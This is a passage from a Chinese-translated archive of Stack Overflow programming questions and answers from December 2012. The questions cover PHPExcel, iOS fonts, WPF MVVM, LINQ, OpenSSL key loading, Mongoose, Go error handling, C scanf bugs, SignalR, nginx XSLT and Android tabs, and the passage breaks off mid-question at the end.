$objReader = new PHPExcel_Reader_Excel2007();
$objPHPExcel = $objReader->load('Book1.xlsx');
$highestRowEM = $objPHPExcel->getActiveSheet()->getHighestRow();
echo $highestRowEM;
for($i=0;$i<$highestRowEM;$i++){
    $varval=$objPHPExcel->getActiveSheet()->getCell('A'.$i)->getValue();
    if($varval==""){
        break;
    }
}
echo $i;
$objWriter = PHPExcel_IOFactory::createWriter($objPHPExcel, 'Excel2007');
$objWriter->save('Book1.xlsx'); 
```

什么清理带有工作表的工作簿，其中

```
 `include'../Classes/PHPExcel.php';
  include'../Classes/PHPExcel/IOFactory.php';
  set_time_limit(0);
  ini_set('memory_limit', '-1');
  $xlsxfiles=$_SESSION['file'];
  echo $xlsxfiles;
  echo "<br>";
  $objReader = PHPExcel_IOFactory::createReader('Excel2007');
  $objPHPExcel = PHPExcel_IOFactory::load('../upload/'.$xlsxfiles);
  $objWriter = PHPExcel_IOFactory::createWriter($objPHPExcel, "Excel2007");
  ////Validation
  foreach ($objPHPExcel->getWorksheetIterator() as $worksheet) {
      $highestRow = $worksheet-> getHighestDataRow();
      $columnhighest=$worksheet->getHighestDataColumn();
      $columnhighestval=array_search($columnhighest, $alphabet);
      echo 'Worksheet - ' , $worksheet->getTitle()." Number of rows: ".$highestRow."<br>";
      for($cl=0;$cl<$highestRow+1;$cl++){
          for ($ga=1;$ga<$columnhighestval;$ga++){
              $letters=strtoupper($alphabet[$ga]);
              $clean=$worksheet->getCell($letters.$cl)->getValue();
              $cleandone=str_replace(','," ",$clean);
              $worksheet->setCellValue($letters.$cl,$cleandone);
          }
          $objWriter = PHPExcel_IOFactory::createWriter($objPHPExcel, 'Excel2007');
      }
  }
  $objWriter = PHPExcel_IOFactory::createWriter($objPHPExcel, "Excel2007");
  $objWriter->setOffice2003Compatibility(true);
  $objWriter->save('../upload/'.$xlsxfiles);
  echo "Done"; 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-11T14:56:58.290

提示1：

代替

```
for($i=0;$i<$highestRowEM;$i++){
    $varval=$objPHPExcel->getActiveSheet()->getCell('A'.$i)->getValue(); 
```

和

```
$objSheet = $objPHPExcel->getActiveSheet();
for($i=0;$i<$highestRowEM;$i++){
    $varval = $objSheet->getCell('A'.$i)->getValue(); 
```

然后你不会在循环的每次迭代中调用 $objPHPExcel->getActiveSheet() 。

然后告诉我们您实际上想对工作表数据做什么，我们也许可以帮助加快速度

**编辑**

除非必须，否则不要设置单元格值；在需要之前不要实例化 Writer，而且绝对不在循环中；不要使用 $letters 和 $alphabet，而是使用 PHPExcel 内置的例程，或者利用 PHP 的 Perl 风格的字符增量器；不要在循环比较中进行数学运算

```
 ////Validation
  foreach ($objPHPExcel->getWorksheetIterator() as $worksheet) {
      $highestRow = $worksheet->getHighestDataRow();
      $columnhighest=$worksheet->getHighestDataColumn();
      $columnhighest++;
      echo 'Worksheet - ' , $worksheet->getTitle()." Number of rows: ".$highestRow."<br>";
      for($cl = 0; $cl <= $highestRow; $cl++){
          for ($ga='A'; $ga !== $columnhighest; $ga++){
              $clean=$worksheet->getCell($ga.$cl)->getValue();
              $cleandone=str_replace(','," ",$clean);
              if($clean != $cleandone) {
                  $worksheet->setCellValue($ga.$cl, $cleandone);
              }
          }
      }
  }
  $objWriter = PHPExcel_IOFactory::createWriter($objPHPExcel, 'Excel2007'); 
```

# ios - UIButton自定义字体问题

> ID：13822128
> 
> 赞同：0
> 
> 时间：2012-12-11T14:45:06.070
> 
> 标签：ios, ios5, uibutton, uifont, custom-font

我在我的应用程序中添加了一个自定义字体，我通过子类化自定义字体为某些按钮设置了自定义字体，在 xib 自定义字体中完美设置

![在此处输入图像描述](../Images/b6a0eae64f36ef6be633d12163ad0d79.png)

但是在设备中执行时，字体会自动调整为所有按钮的顶部。

![在此处输入图像描述](../Images/4e9d7a8b9ddc2bd6f7f86c85317f2687.png)

这是我的自定义字体子类代码。

```
@interface ButtonWithBebasNeueFont : UIButton 
@end
@implementation ButtonWithBebasNeueFont

- (void)awakeFromNib 
{
    [super awakeFromNib];
    self.titleLabel.font = [UIFont fontWithName:@"BebasNeue" size:self.titleLabel.font.pointSize]; 
```

}

```
@end 
```

请指导我解决此问题。

谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-11T14:53:05.443

您看到的问题是字体的上升属性太小导致的。你有两个选择：

1.  直接编辑字体源（解释[here](https://stackoverflow.com/a/8314197/1064869)）
2.  像这样设置按钮的标题边缘插图：

    ```
    self.titleEdgeInsets = UIEdgeInsetsMake(TOP, LEFT, BOTTOM, RIGHT); 
    ```

只需`TOP, LEFT, BOTTOM, RIGHT`用您的价值观代替。

# c# - 多个视图使用的 ViewModel

> ID：13822129
> 
> 赞同：0
> 
> 时间：2012-12-11T14:45:06.507
> 
> 标签：c#, wpf

在 MVVM 模式中，我有一个由 3 个用户控件使用的通用 ViewModel。我正在实例化 ViewModel 并将其作为参数传递给用户控件的构造函数，但这破坏了 XAML，它要求使用无参数构造函数构造对象。

创建共享 ViewModel 的公认最佳实践是什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-11T14:50:41.387

您可以为 MainWindow 创建一个 ViewModel，其中包含 Type `SharedViewModel`:的属性`public SharedViewModel SharedViewModel {get;set;}`。您将 Window 的 DataContext 设置为 MainViewModel 并绑定到共享的 ViewModel，例如：

```
<Window>
    <Grid>
        <UserControl1 DataContext="{Binding Path=SharedViewModel}"/>
        <UserControl2 DataContext="{Binding Path=SharedViewModel}"/>
        <UserControl3 DataContext="{Binding Path=SharedViewModel}"/>
    </Grid>
</Window> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-11T14:51:32.303

使用 Unity 进行依赖注入 ( [http://msdn.microsoft.com/en-us/library/ff660899(v=pandp.20).aspx](http://msdn.microsoft.com/en-us/library/ff660899(v=pandp.20).aspx) ) 或 MEF 是将视图耦合到视图模型的标准 MVVM 方式

但是不要忘记，MVVM 是一种模式，而不是一个死板的框架。您可以在后面的视图代码中有一个单行连接：

```
InitializeComponent();
this.DataContext = new ViewModel(whatever); 
```

没有天塌下来。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-11T14:51:37.797

您可以为您的 UserControls 添加无参数构造函数

```
public MyUserControl() : base(new MyViewModel())
{}

public MyUserControl(MyViewModel viewModel)
{} 
```

注意：这可能会破坏几个设计范例。:)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-11T14:46:59.113

您可以拥有一个将初始化视图模型的基本视图

# php - PHP 包括缓慢的网站关闭

> ID：13822132
> 
> 赞同：1
> 
> 时间：2012-12-11T14:45:15.273
> 
> 标签：php, wordpress, server-side-includes

我编写了很多 wordpress 主题，每当我编写它们时，我真正喜欢做的一件事是确保我的代码非常干净、有条理并且易于在其中找到内容。

我喜欢确保我的代码有组织的一种方法是我喜欢像这样使用 PHP Include：

`<?php include(TEMPLATEPATH . '/includes/top-container.php'); ?>`

因此，如果我有一个如下所示的网站：

```
<div class="top-container>
...
</div>
<div class="tagline">
...
</div>
<div class="slider">
...
</div>
<div class="middle-container">
     <div class="content">
     ...
     </div>
     <div class="sidebar">
     ...
     </div>
</div>
<div class="bottom-container">
...
</div> 
```

我的最终代码将如下所示：

```
<?php get_header(); ?>

<?php include(TEMPLATEPATH . '/includes/tagline.php'); ?>

<?php include(TEMPLATEPATH . '/includes/slider.php'); ?>

<?php include(TEMPLATEPATH . '/includes/middle-container.php'); ?>

<?php get_footer(); ?> 
```

所以我将我的代码分成几部分并将它们包括在内。我喜欢我的代码的组织方式，但我想知道这是否是一种好习惯？这会减慢我的网站速度吗，尽管我需要提取必要的部分？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-11T14:49:52.073

通常，多次调用读取文件将产生比单个文件更多的 I/O 负载。但是，您可以使用缓存消除该问题。

在我看来，最好的做法是更容易阅读和维护。在需要时担心优化，而不是之前。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-11T15:05:56.573

您应该提出替代解决方案来减少数量。的包含在您的代码中，如此多的包含可能会降低速度。

# java - 在我的 Java 应用程序中捆绑浏览器

> ID：13822133
> 
> 赞同：2
> 
> 时间：2012-12-11T14:45:22.623
> 
> 标签：java, browser, cross-platform, bundle

我创建了一个 Java 应用程序（由 Java Web Start 部署），它需要使用浏览器来显示 HTML5 内容。由于这样的浏览器不一定在用户机器上，我在我的 JAR 中捆绑了一个[便携式版本](http://crportable.sourceforge.net)的[Chromium 。](http://dev.chromium.org)这有两个问题：

*   Jar 将接近 70 MB，Chromium 占用 64 MB。
*   似乎没有一种简单的方法可以在我的后台运行的应用程序和浏览器窗口之间创建通信通道，除了捆绑 Web 服务器，如 Jetty 或 Jibble。

Jar 的大小不是一个大问题，除非它超过 100 MB。但是，便携式 Chromium 应用程序似乎只是 Windows，我也需要部署在 Mac OS 桌面上。目前我正在应用程序模式下启动 Chromium（带有`--app="http://..."`），因为我只需要一个没有界面的浏览器窗口。

所以我的问题是，我可以捆绑另一种浏览器来代替便携式铬吗？最好是更轻的东西，但它肯定**必须支持 HTML5**，并且我可以从 Java 后台应用程序以编程方式控制（虽然捆绑的网络服务器是一个可行的选择，但不确定它如何与各种防火墙一起使用）。也许有一些基于 WebKit 的轻量级和跨平台的东西？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-11T14:47:23.720

JavaFX2（Java 7 附带）带有一个轻量级的 html5 浏览器。

# asp.net-mvc-3 - 使用某些条件过滤 SelectListItem 值

> ID：13822138
> 
> 赞同：0
> 
> 时间：2012-12-11T14:45:41.327
> 
> 标签：asp.net-mvc-3, linq, entity-framework-4, html-select

我有一个用于 DropDownList 的 SelectListItem。我必须根据某些条件进行过滤。如果我尝试添加条件，那么它会给我这样的错误（LINQ to Entities 无法识别方法“System.String ToString()”方法，并且该方法无法转换为存储表达式）。我将在此处添加该代码。请指导我解决这个问题。

**代码**

```
 IEnumerable<SelectListItem> IssueId = (from txt in Db.Issues where txt.BibId == BibId
            select new SelectListItem()
        {
            Text = txt.Description,
            Value = txt.Id.ToString(),
            Selected = true,
        });
        SelectList IssueIds = new SelectList(IssueId, "Value", "Text");
        ViewBag.IssueId = IssueIds; 
```

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-11T15:09:16.473

试试这个：

LINQ2EF 不知道 ToString() 但在 AsEnumerable() 之后，当实现 ToString() 时，您将获得一个本地集合。

```
 IEnumerable<SelectListItem> IssueId = 
(from txt in Db.Issues.Where(e => e.BibId == BibId).AsEnumerable()
    select new SelectListItem()
    {
        Text = txt.Description,
        Value = txt.Id.ToString(),
        Selected = true     
}); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-11T15:12:33.833

Linq To Sql 无法为 txt.Id.ToString() 生成 TSQL

您将需要在执行查询后迭代结果，或者按照 xeondev 的建议强制转换为 Enumerable。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-11T15:15:46.687

该扩展名似乎没有按 linq to Entities 排序，但是一旦遇到问题，您就可以进行映射，例如

```
var issues = (from issue in Db.Issues 
               where issue .BibId == BibId 
               select issue ).ToList();     

IEnumerable<SelectListItem> IssueId = (from txt in issues 
                                       where txt.BibId == BibId
                                      select new SelectListItem()
                                      {
                                        Text = txt.Description,
                                        Value = txt.Id.ToString(),
                                        Selected = true,
                                      }); 
```

# java - 如何使用 JWNL（Wordnet 库）按估计的频率顺序查找同义词？

> ID：13822141
> 
> 赞同：8
> 
> 时间：2012-12-11T14:45:51.050
> 
> 标签：java, wordnet, synonym

有谁知道我如何使用按估计频率排序的 JWNL（Java Wordnet 库）来获取单词的同义词？我知道这可以通过某种方式完成，因为 Wordnet 的应用程序可以做到。（我不知道这是否重要，但我使用的是 Wordnet 2.1）

这是我如何获得同义词的代码，谁能告诉我我应该添加什么......（也欢迎完全不同的方式！）

```
 ArrayList<String> synonyms=new ArrayList<String>();
  System.setProperty("wordnet.database.dir", filepath);
  String wordForm = "make";
  Synset[] synsets = database.getSynsets(wordForm,SynsetType.VERB);
  if (synsets.length > 0) {
       for (int i = 0; i < synsets.length; i++) {
    String[] wordForms = synsets[i].getWordForms();
    for (int j = 0; j < wordForms.length; j++) {
           if(!synonyms.contains(wordForms[j])){
        synonyms.add(wordForms[j]); }
                }
           }
     } 
```

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-12-11T16:04:04.127

既然没有人回答，我想肯定有更多的人想知道同样的想法并且不知道答案。

好吧，我发现有函数 Synset.getTagCount(String)，它返回与单词 (String) 相关的每个同义词集的估计频率值。所以，我所要做的就是根据这个用同义词对 ArrayList 进行排序。

但事实证明，默认情况下，同义词是按排序返回的，所以我使用我在问题中编写的代码得到的结果已经按估计频率排序！

我希望这对将来的人有所帮助:)

# c++ - OpenSSL 我需要有关 PEM_read_RSA_PUBKEY 的更多信息

> ID：13822142
> 
> 赞同：3
> 
> 时间：2012-12-11T14:45:54.250
> 
> 标签：c++, openssl

我没有任何问题，但我想对 openssl 方法进行一些说明：

```
RSA *PEM_read_RSA_PUBKEY(FILE *fp, RSA **x, pem_password_cb *cb, void *u); 
```

该方法返回一个 RSA 指针，但我们还必须在 entry 中提供一个 RSA 双指针。两者都做有什么意义？

例如，当我使用该方法时，以下 3 行将导致我得到相同的结果：

```
key = PEM_read_RSA_PUBKEY(file, &key, NULL, NULL);
key = PEM_read_RSA_PUBKEY(file, NULL, NULL, NULL);
PEM_read_RSA_PUBKEY(file, &key, NULL, NULL); 
```

在所有方面，我的对象`key`都很好。那么我应该在上述 3 之间使用什么解决方案？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-21T21:12:42.190

使用任何适合您的编码风格（以及程序其余部分的编码风格）的解决方案。

一些程序员更愿意从返回值中获取结果。其他人更愿意通过将结果存储作为输入来获得结果。许多 OpenSSL 方法（*但不是全部！*）的结构都是为了提供这种灵活性。

# node.js - 我无法在 Mongoose for Node.js 中进行更新

> ID：13822144
> 
> 赞同：0
> 
> 时间：2012-12-11T14:45:38.707
> 
> 标签：node.js, mongoose

我的架构是：

```
var VenueSchema = new Schema({
    _id: Schema.Types.ObjectId
    ,rating : Number
}) 
```

我正在尝试：

```
var v = new Venue()
v.name = venue.name
Venue.update({ id : Schema.Types.ObjectId(venue.id)}, v, {upsert: true}) 
```

但是数据库中没有任何内容。我哪里错了？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-11T15:30:56.613

您需要在调用中使用`_id`而不是`id`和一个普通的 JS 对象`update`，Mongoose 将为您执行 ObjectId 转换。试试这个：

```
Venue.update({ _id : venue.id}, {name: venue.name}, {upsert: true}); 
```

请注意，`name`它不会出现在您的架构中，这可能不是您想要的。

# web-applications - 基于 Go 的 Web 应用程序中的错误页面

> ID：13822150
> 
> 赞同：5
> 
> 时间：2012-12-11T14:46:14.200
> 
> 标签：web-applications, error-handling, go

我们正在使用 go 构建一个网站，只使用内置的东西，比如`http.HandleFunc`设置路由和`html.template`渲染页面的包。没什么特别的，而且效果很好。现在我开始考虑错误处理，并想捕捉恐慌和诸如此类的东西并重定向到静态错误页面。最好的方法是什么？

我首先考虑的蛮力方法是在检测到错误时重定向，但如果使用通用的包罗万象也很好。我在文档中没有找到任何关于它的内容。

（也沿着同样的思路考虑 404。）

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-12-11T15:20:30.767

golang 博客上有一篇很棒的关于错误处理的文章，它最后特别涵盖了与 Web 相关的错误。

[http://blog.golang.org/2011/07/error-handling-and-go.html](http://blog.golang.org/2011/07/error-handling-and-go.html)

基本上，您使用自己的可以返回错误的常规 http 处理程序进行包装。包装器检查您的新处理程序是否返回错误，如果是，则作出反应。我使用与此类似的东西，我也称之为恢复。这是我使用的代码片段（免费且开放）。

虽然我还没有为错误提供自定义页面，但它一直在我的脑海中并且应该很容易添加。

```
// Error is the expected return of a dae.Handler, or nil otherwise.
type Error struct {
    Error   error
    Code    int
    Message string
}

// NewError is a helper for creating an Error pointer.
func NewError(err error, code int, msg string) *Error {
    return &Error{err, code, msg}
}

// Handler is used to cast functions to its type to implement ServeHTTP.
// Code that panics is automatically recovered and delivers a server 500 error.
type Handler func(http.ResponseWriter, *http.Request) *Error

// NewHandler is a helper to chain multiple functions together.
func New(fn ...Handler) Handler {
    if len(fn) == 0 {
        panic("No Handlers passed in.")
    }

    h := Handler(fn[0])
    for i := 1; i < len(fn); i++ {
        h = h.Add(fn[i])
    }
    return h
}

// ServeHTTP implements the http.Handler interface. If an appHandler returns an
// error, the error is inspected and an appropriate response is written out.
func (fn Handler) ServeHTTP(w http.ResponseWriter, r *http.Request) {
    defer func() {
        if r := recover(); r != nil {
            log.Printf("%v", r)
            http.Error(w, "A serious error has occured.", 500)
            if Debug {
                panic(r.(error))
            }
        }
    }()

    if e := fn(w, r); e != nil {
        log.Printf("Code: %v, Message: \"%s\", Error: %v", e.Code, e.Message, e.Error)
        switch e.Code {
        case 500:
            http.Error(w, e.Message, e.Code)
        case 404:
            http.NotFound(w, r)
            fmt.Fprint(w, e.Message)
        case 200:
            fmt.Fprint(w, e.Message)
        }
    }
} 
```

# api - 如何为过滤后的数据创建 REST api

> ID：13822151
> 
> 赞同：1
> 
> 时间：2012-12-11T14:46:18.133
> 
> 标签：api, rest

我读了很多书，我知道 REST API 使用 HTTP 动词映射资源。例如，当教程显示像 Employee 这样的示例时，这很容易理解。PUT 将是一条新记录（如果它不存在）或更新；GET 将提取包含所有员工的列表，GET`api.example.com/employee/12`将提取 ID = 12 的员工的记录。

但是，例如，我如何映射更有用的查询，例如“让我找到所有工资低于 50.000、在公司工作不到 2 年且婚姻状况为单身的员工”？换句话说，我如何参数化查询？添加参数是否正确`api.example.com/Employee?salary<50000&years<2&marital-status=single" ?`

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-11T15:02:33.957

理论：

如果您向查询添加参数，它们只是 URL 的一部分。URL 的形式不会告诉您任何有关您的 API 是否为 RESTful 的信息。如果您的带有查询字符串的 API 遵守此处描述的约束条件，则它是宁静的：[http](http://en.wikipedia.org/wiki/Representational_state_transfer) ://en.wikipedia.org/wiki/Representational_state_transfer并且（可选）遵循指导原则

所以只要你的查询参数不做任何疯狂的事情，比如随机改变一些资源的状态，那么你的 API 仍然是 RESTful

实践：

任何合理的 REST API 都需要“索引”路由的查询参数。在实践中，LinkedIn 的 REST API 具有仅从某人的个人资料中选择字段的查询参数。在这种情况下，URL 看起来与您的完全不同，但仍然遵循 REST 的原则。

你的情况：

您的查询字符串不能包含不等式，只能包含键+值对。您需要将其表达得更像 ?max-salary=50000&max-years=2&marital-status=single"。您还可以以不同的方式命名您的“索引”路线：api.example.com/employees（复数）

# c++ - 查看 C++ DLL 的成员

> ID：13822156
> 
> 赞同：5
> 
> 时间：2012-12-11T14:46:03.147
> 
> 标签：c++, reflection, legacy-code

我有一个 1998 年编写的 C++ DLL，我想查看成员（属性、字段、方法、构造函数等）。我的理解是，编写 DLL 的公司已不再存在，但仍在使用。

如果我只有 DLL，这可能吗？或者您是否只需要知道 DLL 中的内容才能使用它。如果可能的话，我会怎么做？

我希望通过 P/Invoke 使用来自 .Net 的 DLL。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-12-11T14:53:48.080

得到这个： http: [//www.dependencywalker.com/](http://www.dependencywalker.com/)，使用`depends.exe`打开DLL，然后在“查看”菜单中激活“取消装饰C++函数”。我主要使用它来查找依赖项，但它也公开了 DLL 的入口点。

这不是万无一失的，因为公开类的 DLL 不必导出其方法。例如，纯虚方法布局足够统一，您可以将实例公开为接口指针，并可能带有工厂函数。但它可能会解决你的问题。

无论如何，您需要一份依赖步行者的副本。:)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-12-11T14:50:07.953

您可以使用[IDA](http://www.hex-rays.com/products/ida/index.shtml)之类的工具来反汇编二进制文件并尝试找出函数名称，但这可能很难。为什么你只有DLL？从关联库的导出表中获取信息会容易得多，或者更好的是，从头文件中获取信息。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2017-06-29T06:07:21.567

您可以使用 VS 命令提示符，一个简单的命令是：

```
dumpbin /exports <nameofdll> 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2021-09-24T10:55:04.933

NirSoft 提供“DLL 导出查看器”

[https://www.nirsoft.net/utils/dllexp.zip](https://www.nirsoft.net/utils/dllexp.zip)

方便的 UI 应用程序，可以显示 dll 成员。

# c - 在 C 中获取调试错误

> ID：13822157
> 
> 赞同：2
> 
> 时间：2012-12-11T14:46:40.530
> 
> 标签：c

我是'C'的学习者并编写了一个代码，但在我编译它之后，显示一个**调试错误**消息，这里是代码：

```
#include<stdio.h>
void main()
{
    int n,i=1;
    char c;
    printf("Enter Charecter:\t");
    scanf("%s",&c);
    printf("Repeat Time\t");
    scanf("%d",&n);
    n=n;
    while (i <= n)
    {
        printf("%c",c);
        i++;
    }
} 
```

请告诉我为什么会发生这种情况以及如何解决它

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-11T14:48:48.797

`scanf("%s",&c);`应该`scanf("%c",&c);`

`%s`格式说明符告诉您`scanf`正在传递一个 char 数组。您正在传递一个字符，因此需要`%c`改用。

您当前的代码将表现出不可预测的行为，因为`scanf`将尝试向您提供的地址写入一个任意长的单词，后跟一个 nul 终止符。该地址为单个字符分配了内存（在堆栈上），因此您最终会覆盖程序其他部分可能使用的内存（例如其他局部变量）。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-12-11T14:49:19.093

`scanf("%s", &c)`正在写入内存，它不应该是`c`一个单一的`char`，而是`"%s"`希望它的参数是一个数组。当`scanf()`附加一个空字符时，它至少会写入两个`char`（`c`读取`char`自`stdin`加上空终止符），这是一个太多了。

使用 a`char[]`并限制`char`写入的数量`scanf()`：

```
char data[10];
scanf("%9s", data); 
```

并使用`printf("%s", data);`代替`%c`或`"%c"`用作 中的格式说明符`scanf()`。

始终检查 的返回值[`scanf()`](http://en.cppreference.com/w/c/io/fscanf)，即成功分配的次数，以确保后续代码不会处理陈旧或未初始化的变量：

```
if (1 == scanf("%d", &n))
{
    /* 'n' assigned. 'n = n;' is unrequired. */
} 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-12-11T15:04:51.210

我不确定您是否理解其他问题的答案：[Odd loop does not work using %c](https://stackoverflow.com/questions/13814128/odd-loop-does-not-work-using-c)

这些[格式说明符](http://www.codingunit.com/printf-format-specifiers-format-conversions-and-formatted-output)均用于特定作业。

如果您想获得：

*   `stdin`使用的字符`%c`。

*   字符串（一堆字符）使用`%s`.

*   整数使用`%d`。

这段代码：

```
char c;
printf("Enter Character:\t");
scanf("%c",&c); 
```

将从中读取 1 个字符`stdin`并在此处留下换行符 ( `'\n'`) 字符。因此，假设用户在您拥有`A`的`stdin`缓冲区中输入了字母：

```
A\n 
```

将`scanf()`拉取`'A'`并将其存储在您的中`char c`，并将留下换行符。接下来它会询问您的 int 并且用户可能会输入`5`. `stdin`现在有：

```
\n5 
```

`scanf()`将把它`5`放在`int n`. 如果你想使用那个 '\n' 有很多选项，一个是：

```
char c;
printf("Enter Character:\t");
scanf("%c",&c);  // This gets the 'A' and stores it in c
getchar();       // This gets the \n and trashes it 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-11T14:53:39.360

这是您的代码的工作版本。请参阅代码中的内联注释以进行修复：

```
#include<stdio.h>
void main()
{
    int n,i=1;
    char c;
    printf("Enter Character:\t");
    scanf("%c",&c);//Use %c instead of %s
    printf("Repeat Time\t");
    scanf("%d",&n);
    n=n;//SUGGESTION:This line is not necessary. When you do scanf on 'n' you store the value in 'n'
    while (i <= n)//COMMENT:Appears you want to print the same character n times?
    {
        printf("%c",c);
        i++;
    }
    return;//Just a good practice
} 
```

# c# - SignalR 阻止 chrome UI？

> ID：13822160
> 
> 赞同：2
> 
> 时间：2012-12-11T14:46:18.530
> 
> 标签：c#, javascript, jquery, signalr

我在使用 SignalR 时遇到问题，到目前为止不明白为什么。我为长订单处理操作编写了一个集线器，并注意到它在 FireFox 中可以更新进度，但 Chrome 有问题。因此，我编写了简单的测试中心来检查发生了什么：

```
public class SimpleHub: Hub
{
    public void LongProcess()
    {
        System.Threading.Thread.Sleep(2000);            
        Clients.Caller.AddProgress("Step 1 of 5 has completed.");
        System.Threading.Thread.Sleep(2000);
        Clients.Caller.AddProgress("Step 2 of 5 has completed.");
        System.Threading.Thread.Sleep(3000);
        Clients.Caller.AddProgress("Step 3  of 5 has completed.");
        System.Threading.Thread.Sleep(1000);
        Clients.Caller.AddProgress("Step 4 of 5 has completed.");
        System.Threading.Thread.Sleep(4000);
        Clients.Caller.AddProgress("Step 5 of 5 has completed.", true);
    }
} 
```

它的作用是每隔几秒钟增加一次进度。它在两个浏览器中的干净项目中都可以正常工作 - 每隔几秒钟就会在浏览器中出现新的进度消息。
但是当我在实际项目中尝试它时，使用 Firefox 可以正常工作，但在 Chrome 中，它看起来完全阻塞了 UI（甚至不重新绘制 Chrome 控制台），并且只有在 LongProcess 完成时，它才会添加所有进度消息。
所以问题是，这可能是什么原因 - 可能是一些 jQuery 设置？任何想法要检查什么？顺便说一句，我已经尝试过`longPolling`（`serverSendEvents`这是由 Chrome 中的 signalR 自动选择的），两者的结果相同。

更新：添加了客户端代码：

```
var hub = $.connection.SimpleHub;

hub.client.AddProgress = function (progress) {
   $("#placeOrderProgress").append('<li><span>' + progress + '</span><i></i></li>');
};              

$.connection.hub
            .start()
            .done(function () {                    
                      hub.server.longProcess($('#checkoutForm').toJSON());
                 }); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-12T14:12:17.927

找到了答案。
我们在几个地方使用了 jQuery 远程验证这段代码（以避免赛车条件）：

```
$.ajaxSetup({ async : false }); 
```

所以当我删除它时，SignalR 开始在 Chrome 上正常工作。有趣的是，在 FireFox 上它没有任何影响——不管有没有这行代码，它都可以工作。

# html - 使用 nginx 和代理通过 xslt 解析无效的 html

> ID：13822164
> 
> 赞同：0
> 
> 时间：2012-12-11T14:46:59.753
> 
> 标签：html, xslt, proxy, nginx

我通过 nginx 将 html 从 Intranet 传递到 Internet。我想对 html 文件进行一些转换。我在我的 nginx.conf 中使用了这样的片段

```
 location /news/ {
            proxy_pass      http://news.intranet/$request_uri;
            proxy_set_header Host news.intranet;
            xslt_types text/html;
            xslt_stylesheet /var/www/www/style-news.xsl;
    } 
```

但如果 html 无效，我会在 error.log 中收到类似“开始和结束标签不匹配”的消息。可能是其他的。

我该如何控制和避免它？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-11T14:57:30.040

你不能。在一般情况下，XML 解析器无法解析 HTML。只有当您使用格式良好的 XHTML 时，它才会起作用。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-08-20T00:39:56.973

Nginx 的 XSLT 模块的当前实现不支持 HTML，因为它当前使用 XML 解析器。也就是说，可以修补 XSLT 模块以包括对 HTML 转换的支持。[在https://github.com/jcu-eresearch/nginx-custom-build/blob/master/nginx-xslt-html-parser](https://github.com/jcu-eresearch/nginx-custom-build/blob/master/nginx-xslt-html-parser.patch)可以找到当前稳定版 Nginx（撰写本文时为 1.4.2）的补丁.[补丁](https://github.com/jcu-eresearch/nginx-custom-build/blob/master/nginx-xslt-html-parser.patch)。您将需要应用此补丁并重新编译 Nginx，确保您为编译配置了`--with-http_xslt_module`支持。Nginx 早期版本（大约 v1.1）的原始补丁最初来自[https://bitbucket.org/lrowe/nginx-xslt-html-parser](https://bitbucket.org/lrowe/nginx-xslt-html-parser)。

配置此 Nginx 修补版本的说明位于 [http://docs.diazo.org/en/latest/deployment.html#nginx](http://docs.diazo.org/en/latest/deployment.html#nginx)。因此，在您的情况下，配置 Nginx 将如下所示：

```
location /news/ {
    proxy_pass         http://news.intranet/$request_uri;
    proxy_set_header   Host news.intranet;
    xslt_stylesheet    /var/www/www/style-news.xsl;
    xslt_html_parser   on;
    xslt_types         text/html;
} 
```

这将启用特殊的 HTML 解析器，并启用 HTML 内容类型的解析器。

# android - ActionbarSherlock 用 ViewPager 固定标签？

> ID：13822168
> 
> 赞同：0
> 
> 时间：2012-12-11T14:47:12.717
> 
> 标签：android, actionbarsherlock, android-viewpager, android-tabs

我正在使用带有 ViewPager 的 ActionbarSherlock 选项卡导航。**我想要在整个屏幕宽度上的三个固定选项卡。**

但制表符不占用整个宽度：

![在此处输入图像描述](../Images/cd7ac87f5091e9b156f8fa486f0e748b.png)

代码是标准的。在这里粘贴有点太长了，所以[放在 pastebin 上](http://pastebin.com/mTpVsq0p)。动作条夏洛克 4.2。

**如何在整个宽度上拉伸标签？**

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-11T15:24:05.777

> 我想要在整个屏幕宽度上的三个固定选项卡。

您将需要找到一个选项卡的实现`ViewPager`（例如，`PagerTabStrip`来自 Android 支持包，或来自 ViewPagerIndicator 的选项卡实现）并修改它以使其看起来像您想要的那样。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-03T11:02:31.250

如果使用了 Actionbarsherlock 选项卡，它将支持所有版本。

# c# - 移位数组中的单个元素

> ID：13822176
> 
> 赞同：0
> 
> 时间：2012-12-11T14:46:29.660
> 
> 标签：c#, arrays

我想每次将数组中的一个元素向右移动，同时在 C# 中以特定顺序保留原始元素。

好的，所以我被要求改写代码，我可以理解为什么，所以我们开始吧：

我可能有一个号码 48390

```
 //the ar elements have been commented out to show that we never know what ar contains but only the that I will always want to shift; ar[4]
    int[] ar = new int[5];
    //ar[0] = 4
    //ar[1] = 8
    //ar[2] = 3
    //ar[3] = 9
    //ar[4] = 0
    while(ar != 04839)
    {
       Shift code
    } 
```

